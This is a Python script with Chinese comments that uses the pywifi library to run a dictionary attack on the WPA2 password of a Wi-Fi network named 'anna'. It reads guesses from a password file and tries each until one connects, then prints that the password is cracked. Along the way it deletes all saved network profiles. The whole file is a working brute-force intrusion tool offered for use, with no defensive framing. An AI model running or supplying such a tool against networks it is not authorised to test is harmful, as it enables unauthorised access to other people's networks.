import os
import argparse
import json
import os
from tqdm import tqdm

# parse = argparse.ArgumentParser(description="命令行传入一个数字")
#
# parse.add_argument("integers", type=int, nargs="+", help="input an integer")
# args = parse.parse_args()
#
# # 获得传入的参数
# print(args)
#
# # 获得integers参数
# print(args.integers)


import pywifi
from pywifi import const
import time

#测试连接，返回链接结果
def wifiConnect(pwd):
    #抓取网卡接口
    wifi=pywifi.PyWiFi()
    #获取第一个无线网卡
    ifaces=wifi.interfaces()[0]
    #断开所有连接
    ifaces.disconnect()
    # time.sleep(1)
    wifistatus=ifaces.status()
    if wifistatus ==const.IFACE_DISCONNECTED:
        #创建WiFi连接文件
        profile=pywifi.Profile()
        #要连接WiFi的名称
        profile.ssid="anna"
        #网卡的开放状态
        profile.auth=const.AUTH_ALG_OPEN
        #wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #调用密码
        profile.key=pwd
        #删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tep_profile=ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        #wifi连接时间
        time.sleep(1)
        if ifaces.status()==const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接") 

#读取密码本
def readPassword():
    print("开始破解:")
    #密码本路径
    path="./password.txt"
    #打开文件
    # with open(path, "r") as fr:
    #     lines = fr.readlines()
    # for line in tqdm(lines):
    #     line = line.strip('\n')
    #     bool=wifiConnect(line)
    #     if bool:
    #         print("密码已破解： ", line)
    #         print("WiFi已自动连接!!!")
    #         break
    #     else:
    #         #跳出当前循环，进行下一次循环
    #         print("密码破解中....密码校对: ", line)
    file=open(path,"r")
    while True:
        try:
            #一行一行读取
            pad=file.readline()
            bool=wifiConnect(pad)
            
            if bool:
                print("密码已破解： ",pad)
                print("WiFi已自动连接!!!")
                break
            else:
                #跳出当前循环，进行下一次循环
                print("密码破解中....密码校对: ",pad)
        except:
            continue


def test():
    wifi=pywifi.PyWiFi()
    #获取无线网卡
    ifaces=wifi.interfaces()[0]
    print(ifaces)


if __name__ == "__main__":
    test()

    # res = wifiConnect(pwd='95279527')

    readPassword()

